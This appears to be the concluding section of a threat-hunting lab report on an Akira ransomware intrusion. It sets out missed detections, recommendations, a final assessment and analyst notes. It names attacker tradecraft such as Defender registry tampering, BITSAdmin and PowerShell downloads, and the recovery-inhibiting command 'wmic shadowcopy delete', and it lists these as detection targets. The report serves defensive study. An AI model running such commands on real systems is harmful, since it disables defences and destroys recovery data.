- Unapproved or suspiciously deployed **remote-access software** executed from a user-writeable or public path without apparent early containment.
- **Defender tampering** via `DisableAntiSpyware` occurred before impact, indicating insufficient alerting or response coverage for security-control changes.
- Tool transfer using **BITSAdmin**, **PowerShell web requests**, and follow-on utilities was not interrupted before staging and exfiltration preparation.
- Internal discovery from a workstation and later **administrator-context activity** on the server were not contained before ransomware deployment.
- **Archive creation**, **shadow copy deletion**, and **cleanup scripting** all occurred before the intrusion was stopped.

### Recommendations

- Block or tightly restrict **AnyDesk and similar remote-access software**, and alert when launched from `Users\Public`, `Downloads`, `%Temp%`, or `ProgramData`.
- Create high-severity detections for **Defender registry tampering**, **BITSAdmin**, **PowerShell download activity**, **shadow copy deletion**, and suspicious archive creation.
- Monitor for **new executables** in `C:\ProgramData\`, `C:\Users\Public\`, and other user-controlled paths, especially when filenames resemble sync or update utilities.
- Detect **multi-IP internal enumeration** from a single process on a workstation and escalate quickly when followed by privileged server logons.
- Track **suspicious filename-to-hash changes** to catch payload refresh activity and follow-on persistence maintenance.
- Prefer **contains-based searches** for ransomware markers when preserved filenames show embedded patterns such as `.akira.lnk` instead of a simple final extension.

---

<a id="final-assessment"></a>
## 🧾 Final Assessment

The available evidence supports a **high-confidence Akira ransomware intrusion** with likely **initial access through abused remote desktop software**, **post-compromise beaconing and reconnaissance**, **privileged movement into a server**, **data staging for theft**, and **destructive impact through ransomware execution**. The presence of **`exfil_data.zip`**, **`updater.exe`**, **`wmic shadowcopy delete`**, and filenames containing **`.akira`** indicates a mature intrusion sequence consistent with **double-extortion tradecraft**. Defensive improvements should focus on **remote-access control, Defender tampering visibility, download-and-staging detections, archive creation, recovery-inhibition commands, and privileged activity correlation across hosts**.

---

<a id="analyst-notes"></a>
## 📎 Analyst Notes

- Report structure follows the provided template, but each of the **40 flags** is preserved as its own individual section.
- Google Form answers were treated as the ground truth for findings and terminology.
- Exact timestamps, parent processes, and some lineage details were not fully preserved in the source material and are intentionally marked for screenshot backfill rather than invented.
- KQL sections were sourced from the reconstructed hunt pack and refined where needed to reflect preserved filename behavior, including the `.akira` marker appearing inside filenames such as `.akira.lnk`.
- Evidence remains reproducible through Defender-style advanced hunting.
